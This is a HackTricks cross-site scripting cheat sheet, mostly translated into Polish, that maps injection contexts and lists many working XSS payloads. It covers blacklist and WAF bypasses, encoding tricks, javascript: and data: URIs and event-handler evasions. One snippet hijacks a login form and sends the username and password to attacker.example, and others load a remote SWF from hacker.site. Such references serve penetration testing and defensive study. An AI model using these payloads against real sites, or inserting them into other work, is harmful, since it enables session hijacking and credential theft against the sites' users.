# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Sprawdź, czy **jakakolwiek wartość, którą kontrolujesz** (_parametry_, _ścieżka_, _nagłówki_?, _ciasteczka_?) jest **odzwierciedlana** w HTML lub **używana** przez kod **JS**.
2. **Znajdź kontekst**, w którym jest odzwierciedlana/używana.
3. Jeśli jest **reflektowana**
1. Sprawdź, **jakie symbole możesz użyć** i w zależności od tego przygotuj payload:
1. W **surowym HTML**:
1. Czy możesz tworzyć nowe tagi HTML?
2. Czy możesz użyć zdarzeń lub atrybutów wspierających protokół `javascript:`?
3. Czy możesz obejść zabezpieczenia?
4. Czy zawartość HTML jest interpretowana przez jakiś client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), który mógłbyś nadużyć poprzez [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Jeśli nie możesz tworzyć tagów HTML, które wykonują kod JS, czy możesz nadużyć [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Wewnątrz **tagu HTML**:
1. Czy możesz wyjść do surowego kontekstu HTML?
2. Czy możesz stworzyć nowe zdarzenia/atrybuty do wykonania kodu JS?
3. Czy atrybut, w którym jesteś umieszczony, wspiera wykonanie JS?
4. Czy możesz obejść zabezpieczenia?
3. Wewnątrz **kodu JavaScript**:
1. Czy możesz uciec z tagu `<script>`?
2. Czy możesz uciec z łańcucha i wykonać inny kod JS?
3. Czy Twoje dane znajdują się w template literals \`\`?
4. Czy możesz obejść zabezpieczenia?
4. Funkcja JavaScript **bywa wywoływana**
1. Możesz wskazać nazwę funkcji do wykonania. np.: `?callback=alert(1)`
4. Jeśli jest **używana**:
1. Możesz wykorzystać **DOM XSS**, zwróć uwagę, w jaki sposób Twoje dane są kontrolowane i czy Twoje **kontrolowane dane są używane przez jakiś sink.**

Pracując nad złożonym XSS może Cię zainteresować poznanie:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Wartości odzwierciedlone

Aby pomyślnie wykorzystać XSS, pierwszą rzeczą, którą musisz znaleźć, jest **wartość kontrolowana przez Ciebie, która jest odzwierciedlana** na stronie.

- **Reflektowane pośrednio**: Jeśli odkryjesz, że wartość parametru lub nawet ścieżka jest odzwierciedlana na stronie, możesz wykorzystać **Reflected XSS**.
- **Zapisane i reflektowane**: Jeśli znajdziesz wartość przez Ciebie kontrolowaną, która jest zapisywana po stronie serwera i jest odzwierciedlana za każdym razem przy odwiedzaniu strony, możesz wykorzystać **Stored XSS**.
- **Dostępne przez JS**: Jeśli znajdziesz wartość kontrolowaną przez Ciebie, do której dostęp ma JS, możesz wykorzystać **DOM XSS**.

## Konteksty

Przy próbie wykorzystania XSS pierwszą rzeczą, którą musisz wiedzieć, jest **gdzie Twoje dane są odzwierciedlane**. W zależności od kontekstu będziesz mógł wykonać dowolny kod JS na różne sposoby.

### Surowy HTML

Jeśli Twoje dane są **odzwierciedlane w surowym HTML** strony, będziesz musiał nadużyć jakiegoś **tagu HTML**, aby wykonać kod JS: `<img , <iframe , <svg , <script` ... to tylko niektóre z wielu możliwych tagów HTML, których możesz użyć.\
Również miej na uwadze [Client Side Template Injection](../client-side-template-injection-csti.md).

### Wewnątrz atrybutu tagu HTML

Jeśli Twoje dane są odzwierciedlane wewnątrz wartości atrybutu tagu, możesz spróbować:

1. **Uciec z atrybutu i z tagu** (wtedy będziesz w surowym HTML) i stworzyć nowy tag HTML do nadużycia: `"><img [...]`
2. Jeśli **możesz uciec z atrybutu, ale nie z tagu** (`>` jest kodowany lub usuwany), w zależności od tagu możesz **stworzyć zdarzenie**, które wykona kod JS: `" autofocus onfocus=alert(1) x="`
3. Jeśli **nie możesz uciec z atrybutu** (`"` jest kodowane lub usuwane), to w zależności od **którego atrybutu** dotyczy odzwierciedlenie oraz **czy kontrolujesz całą wartość czy tylko jej część**, będziesz mógł to nadużyć. Na **przykład**, jeśli kontrolujesz event typu `onclick=` będziesz mógł wykonać dowolny kod po kliknięciu. Innym ciekawym **przykładem** jest atrybut `href`, gdzie możesz użyć protokołu `javascript:`, aby wykonać dowolny kod: **`href="javascript:alert(1)"`**
4. Jeśli Twoje dane są odzwierciedlane w ramach "**nieeksploatowalnych tagów**", możesz spróbować sztuczki z **`accesskey`**, aby nadużyć podatność (będziesz potrzebował jakiejś formy social engineeringu, aby to wykorzystać): **`" accesskey="x" onclick="alert(1)" x="`**

Dziwny przykład Angular wykonujący XSS, jeśli kontrolujesz nazwę klasy:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Wewnątrz kodu JavaScript

W tym przypadku twoje dane są odzwierciedlane między **`<script> [...] </script>`** tagami strony HTML, wewnątrz pliku `.js` lub wewnątrz atrybutu używającego protokołu **`javascript:`**:

- Jeśli odzwierciedlone między **`<script> [...] </script>`** tagami, nawet jeśli twoje dane są wewnątrz jakichkolwiek cudzysłowów, możesz spróbować wstrzyknąć `</script>` i uciec z tego kontekstu. Działa to, ponieważ **przeglądarka najpierw sparsuje tagi HTML**, a dopiero potem zawartość, więc nie zauważy, że wstrzyknięty przez ciebie `</script>` znajduje się w kodzie HTML.
- Jeśli odzwierciedlone **wewnątrz stringa JS** i poprzedni trik nie działa, musisz **opuścić** string, **wykonać** swój kod i **odtworzyć** kod JS (jeśli pojawi się błąd, nie zostanie wykonany):
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Jeśli odzwierciedlone wewnątrz template literals możesz **osadzić wyrażenia JS** używając składni `${ ... }`:` ` var greetings = `Hello, ${alert(1)}` `
- **Kodowanie Unicode** pozwala zapisać **prawidłowy javascript**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting odnosi się do możliwości **deklarowania funkcji, zmiennych lub klas po ich użyciu, dzięki czemu można wykorzystać scenariusze, w których XSS używa niezadeklarowanych zmiennych lub funkcji.**\
**Sprawdź następującą stronę po więcej informacji:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Wiele stron ma endpoints, które **akceptują jako parametr nazwę funkcji do wykonania**. Powszechny przykład spotykany w naturze wygląda tak: `?callback=callbackFunc`.

Dobrym sposobem, by sprawdzić, czy coś przekazanego bezpośrednio przez użytkownika jest próbą wykonania, jest **zmodyfikować wartość parametru** (na przykład na 'Vulnerable') i szukać w konsoli błędów takich jak:

![](<../../images/image (711).png>)

Jeśli jest podatne, możesz być w stanie **wywołać alert** po prostu wysyłając wartość: **`?callback=alert(1)`**. Jednak bardzo często takie endpoints **walidują zawartość**, aby zezwolić tylko na litery, cyfry, kropki i podkreślenia (**`[\w\._]`**).

Jednak nawet przy tym ograniczeniu nadal można wykonać pewne akcje. Dzieje się tak, ponieważ możesz użyć tych dozwolonych znaków, by **uzyskać dostęp do dowolnego elementu w DOM**:

![](<../../images/image (747).png>)

Przydatne funkcje do tego:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Możesz też spróbować bezpośrednio **wywołać funkcje Javascript**: `obj.sales.delOrders`.

Jednak zwykle endpointy wykonujące wskazaną funkcję to endpointy bez zbyt interesującego DOM — **inne strony w tym samym origin** będą miały **ciekawszy DOM** do wykonania większej liczby akcji.

Dlatego, aby **wykorzystać tę podatność w innym DOM** opracowano eksploatację **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Istnieje **kod JS**, który **niebezpiecznie** używa danych **kontrolowanych przez atakującego**, takich jak `location.href`. Atakujący może to wykorzystać do wykonania dowolnego kodu JS.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Tego typu XSS można znaleźć **wszędzie**. Nie zależą one tylko od eksploatacji klienta aplikacji webowej, lecz od **dowolnego** **kontekstu**. Ten rodzaj **dowolnego wykonania JavaScript** może być nawet wykorzystany do uzyskania **RCE**, **odczytu** **dowolnych** **plików** na klientach i serwerach, i więcej.\
Kilka **przykładów**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Gdy twój input jest odzwierciedlany **wewnątrz strony HTML** albo możesz uciec i wstrzyknąć kod HTML w tym kontekście, **pierwszą** rzeczą, którą musisz zrobić, jest sprawdzenie, czy możesz użyć `<` do stworzenia nowych tagów: po prostu spróbuj **odzwierciedlić** ten **char** i sprawdź, czy jest **HTML encoded** czy **usuwany**, albo czy jest **odzwierciedlony bez zmian**. **Tylko w tym ostatnim przypadku będziesz w stanie to wykorzystać**.\
W takich przypadkach także **pamiętaj o** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Note: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_

W tym przypadku, i jeśli nie jest stosowany black/whitelisting, możesz użyć payloadów takich jak:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
But, if tags/attributes black/whitelisting is being used, you will need to **brute-force które tagi** możesz utworzyć.\\
Gdy już **zlokalizujesz, które tagi są dozwolone**, będziesz musiał **brute-force atrybuty/zdarzenia** wewnątrz znalezionych prawidłowych tagów, aby zobaczyć, jak możesz zaatakować kontekst.

### Tagi/Zdarzenia brute-force

Przejdź do [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) i kliknij na _**Copy tags to clipboard**_. Następnie wyślij wszystkie za pomocą Burp intruder i sprawdź, czy któryś z tagów nie został wykryty jako złośliwy przez WAF. Gdy odkryjesz, których tagów możesz użyć, możesz **brute force wszystkie zdarzenia** używając prawidłowych tagów (na tej samej stronie kliknij na _**Copy events to clipboard**_ i postępuj według tej samej procedury co wcześniej).

### Niestandardowe tagi

Jeśli nie znalazłeś żadnego prawidłowego tagu HTML, możesz spróbować **utworzyć niestandardowy tag** i wykonać kod JS przy użyciu atrybutu `onfocus`. W żądaniu XSS musisz zakończyć URL znakiem `#`, aby strona **skupiła się na tym obiekcie** i **wykonała** kod:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Jeśli używana jest jakaś blacklist, możesz spróbować ją bypassować kilkoma głupimi sztuczkami:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Więcej małych XSS dla różnych środowisk** payload [**można znaleźć tutaj**](https://github.com/terjanq/Tiny-XSS-Payloads) i [**tutaj**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Ostatni używa 2 znaków unicode, które rozwijają się do 5: telsr\
Więcej takich znaków można znaleźć [tutaj](https://www.unicode.org/charts/normalization/).\
Aby sprawdzić, na jakie znaki są rozkładane, zobacz [tutaj](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

If in order to exploit the vulnerability you need the **user to click a link or a form** with prepopulated data you could try to [**wykorzystać Clickjacking**](../clickjacking.md#xss-clickjacking) (if the page is vulnerable).

### Niemożliwe - Dangling Markup

If you just think that **it's impossible to create an HTML tag with an attribute to execute JS code**, you should check [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)because you could **exploit** the vulnerability **without** executing **JS** code.

## Wstrzykiwanie wewnątrz tagu HTML

### Wewnątrz tagu/ucieczka z wartości atrybutu

If you are in **inside a HTML tag**, the first thing you could try is to **escape** from the tag and use some of the techniques mentioned in the [poprzedniej sekcji](#injecting-inside-raw-html) to execute JS code.\
If you **cannot escape from the tag**, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (_uwaga: w tym przykładzie podwójne cudzysłowy są użyte do ucieczki z atrybutu, nie będą one potrzebne jeśli Twój input jest odzwierciedlany bezpośrednio wewnątrz tagu_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Zdarzenia stylu**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### W obrębie atrybutu

Nawet jeśli **nie możesz uciec z atrybutu** (`"` jest kodowany lub usuwany), w zależności od **którego atrybutu** odbija się Twoja wartość oraz **czy kontrolujesz całą wartość, czy tylko jej część**, będziesz w stanie to wykorzystać. Na **przykład**, jeśli kontrolujesz zdarzenie takie jak `onclick=` będziesz w stanie sprawić, że wykona dowolny kod po kliknięciu.\
Innym ciekawym **przykładem** jest atrybut `href`, w którym możesz użyć protokołu `javascript:` do wykonania dowolnego kodu: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

Znaki **HTML encoded characters** wewnątrz wartości atrybutów tagów HTML są **decoded on runtime**. Dlatego coś takiego będzie poprawne (payload jest pogrubiony): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Zauważ, że **any kind of HTML encode is valid**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Zwróć uwagę, że URL encode również zadziała:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass wewnątrz eventu przy użyciu Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Specjalne protokoły wewnątrz atrybutu

Możesz tam użyć protokołów **`javascript:`** lub **`data:`** w niektórych miejscach, aby **wykonywać dowolny kod JS**. Niektóre będą wymagać interakcji użytkownika, inne nie.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Miejsca, w których można wstrzyknąć te protokoły**

**Ogólnie** protokół `javascript:` może być **użyty w dowolnym tagu, który akceptuje atrybut `href`** oraz w **większości** tagów, które akceptują **atrybut `src`** (ale nie `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Inne obfuscation tricks**

_**W tym przypadku HTML encoding i Unicode encoding trick z poprzedniej sekcji również działają, ponieważ znajdujesz się wewnątrz atrybutu.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Co więcej, jest jeszcze jeden **sprytny trik** dla takich przypadków: **Nawet jeśli Twoje dane wejściowe wewnątrz `javascript:...` są URL encoded, zostaną URL decoded zanim zostaną executed.** Zatem, jeśli musisz **escape** z **string** używając **single quote** i widzisz, że **są URL encoded**, pamiętaj, że **to nie ma znaczenia,** zostanie **interpreted** jako **single quote** podczas **execution** time.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Zauważ, że jeśli spróbujesz **użyć obu** `URLencode + HTMLencode` w dowolnej kolejności, aby zakodować **payload**, to **nie będzie** **działać**, ale możesz **mieszać je wewnątrz payloadu**.

**Używanie Hex i Octal encode z `javascript:`**

Możesz użyć **Hex** i **Octal encode** wewnątrz atrybutu `src` elementu `iframe` (przynajmniej), aby zadeklarować **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
If you can inject any URL in an arbitrary **`<a href=`** tag that contains the **`target="_blank" and rel="opener"`** attributes, check the **following page to exploit this behavior**:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Omijanie "on" event handlers

Przede wszystkim sprawdź tę stronę ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) dla przydatnych **"on" event handlers**.\
Jeśli istnieje jakaś blacklist uniemożliwiająca utworzenie tych event handlerów, możesz spróbować następujących obejść:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS w "Unexploitable tags" (hidden input, link, canonical, meta)

Z [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **teraz możliwe jest nadużycie hidden inputs za pomocą:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
A w **meta tagach**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Z [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Możesz wykonać **XSS payload wewnątrz ukrytego atrybutu**, pod warunkiem że uda ci się **przekonać** **victim** do naciśnięcia **kombinacji klawiszy**. W Firefox na Windows/Linux kombinacja klawiszy to **ALT+SHIFT+X**, a na OS X to **CTRL+ALT+X**. Możesz określić inną kombinację, używając innego klawisza w access key attribute. Oto wektor:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**The XSS payload will be something like this: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Kilka sztuczek z użyciem różnych encoding zostało już omówionych w tej sekcji. Wróć, aby dowiedzieć się, gdzie możesz użyć:

- **HTML encoding (HTML tags)**
- **Unicode encoding (może być poprawnym kodem JS):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Przeczytaj [Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Przeczytaj J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Jeśli znalazłeś **XSS w bardzo małej części** strony, która wymaga jakiegoś rodzaju interakcji (może mały link w stopce z elementem onmouseover), możesz spróbować **zmodyfikować przestrzeń, którą zajmuje ten element**, aby zmaksymalizować prawdopodobieństwo uruchomienia linku.

For example, you could add some styling in the element like: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Ale jeśli WAF filtruje atrybut style, możesz użyć CSS Styling Gadgets, więc jeśli znajdziesz, na przykład

> .test {display:block; color: blue; width: 100%\}

i

> \#someid {top: 0; font-family: Tahoma;}

Teraz możesz zmodyfikować nasz link i nadać mu formę

> \<a href="" id=someid class=test onclick=alert() a="">

This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

W takim przypadku twój **input** będzie **odbijany wewnątrz kodu JS** w pliku `.js` lub pomiędzy tagami `<script>...</script>`, albo w eventach HTML, które mogą wykonać kod JS, lub w atrybutach akceptujących protokół `javascript:`.

### Escaping \<script> tag

If your code is inserted within `<script> [...] var input = 'reflected data' [...] </script>` you could easily **escape closing the `<script>`** tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Zauważ, że w tym przykładzie **nawet nie zamknęliśmy pojedynczego apostrofu**. Dzieje się tak, ponieważ **analiza HTML jest wykonywana najpierw przez przeglądarkę**, co obejmuje identyfikację elementów strony, w tym bloków skryptów. Parsowanie JavaScript, aby zrozumieć i wykonać osadzone skrypty, odbywa się dopiero później.

### W kodzie JS

Jeśli `<>` są sanitizowane, nadal możesz **escape the string** tam, gdzie twoje wejście **znajduje się**, i **execute arbitrary JS**. Ważne jest, aby **fix JS syntax**, ponieważ jeśli będą jakiekolwiek błędy, kod JS nie zostanie wykonany:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Gdy wejście użytkownika trafia do cytowanego łańcucha JavaScript (np. server-side echo into an inline script), możesz zakończyć łańcuch, wstrzyknąć kod i naprawić składnię, aby parsowanie pozostało poprawne. Ogólny szkielet:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Przykładowy wzorzec URL, gdy podatny parametr jest odzwierciedlany w łańcuchu JS:
```
?param=test";<INJECTION>;a="
```
This executes attacker JS without needing to touch HTML context (pure JS-in-JS). Combine with blacklist bypasses below when filters block keywords.

### Literały szablonowe \`\`

Aby tworzyć **łańcuchy znaków** poza pojedynczymi i podwójnymi cudzysłowami, JS akceptuje również **backticks** **` `` `**. Są one znane jako template literals, ponieważ pozwalają na **osadzanie wyrażeń JS** przy użyciu składni `${ ... }`.\ W związku z tym, jeśli zauważysz, że Twoje wejście jest **reflected** wewnątrz JS stringa używającego backticks, możesz wykorzystać składnię `${ ... }` do wykonania **dowolnego kodu JS**:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Wykonanie zakodowanego kodu
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads z eval(atob()) i niuanse dotyczące zakresu

Aby skrócić URL-e i obejść proste filtry słów kluczowych, możesz zakodować swoją prawdziwą logikę w base64 i wykonać ją przez `eval(atob('...'))`. Jeśli prosty filtr słów kluczowych blokuje identyfikatory takie jak `alert`, `eval` lub `atob`, użyj Unicode-escaped identyfikatorów, które kompilują się identycznie w przeglądarce, ale omijają filtry dopasowujące ciągi znaków:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Istotny niuans dotyczący zakresu: `const`/`let` zadeklarowane wewnątrz `eval()` mają zakres blokowy i NIE tworzą zmiennych globalnych; nie będą dostępne dla późniejszych skryptów. Użyj dynamicznie wstrzykniętego elementu `<script>`, aby zdefiniować globalne, nieprzypisywalne hooks, gdy to konieczne (np. w celu przejęcia obsługi formularza):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Referencja: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode wykonanie JS
```javascript
alert(1)
alert(1)
alert(1)
```
### Techniki obejścia blacklists w JavaScript

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Specjalne sekwencje ucieczki**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Zastąpienia spacji w kodzie JS**
```javascript
<TAB>
/**/
```
**Komentarze JavaScript (ze** [**JavaScript Comments**](#javascript-comments) **sztuczki)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (z** [**JavaScript new line**](#javascript-new-lines) **sztuczki)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
